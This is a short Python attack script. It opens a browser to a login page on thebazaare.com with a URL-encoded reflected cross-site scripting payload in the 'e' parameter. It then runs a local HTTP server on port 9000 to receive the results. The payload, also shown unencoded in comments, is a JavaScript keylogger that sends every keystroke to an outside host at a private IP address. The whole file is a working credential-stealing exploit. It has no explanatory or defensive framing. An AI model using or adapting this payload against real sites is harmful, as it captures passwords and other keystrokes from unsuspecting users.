import http.server
import socketserver
import webbrowser


# http://www.thebazaare.com/login.aspx?e=
# <script type="text/javascript">
# var l = "";
# document.onkeypress = function (e) {
# l += e.key;
# console.log(l);
# new Image().src="http://10.0.2.15:9000/?key="+escape(l)
# }
# </script>

webbrowser.open('http://www.thebazaare.com/login.aspx?e=%3Cscript%20type%3D%22text%2Fjavascript%22%3E%0Avar%20l%20%3D%20%22%22%3B%0Adocument.onkeypress%20%3D%20function%20(e)%20%7B%0Al%20%2B%3D%20e.key%3Bconsole.log(l)%3B%0Anew%20Image().src%3D%22http%3A%2F%2F10.13.37.38%3A9000%2F%3Fkey%3D%22%2Bescape(l)%0A%7D%0A%3C%2Fscript%3E')

PORT = 9000

handler = http.server.SimpleHTTPRequestHandler
with socketserver.TCPServer(("", PORT), handler) as httpd:
    print("Server started at localhost:" + str(PORT))
    httpd.serve_forever()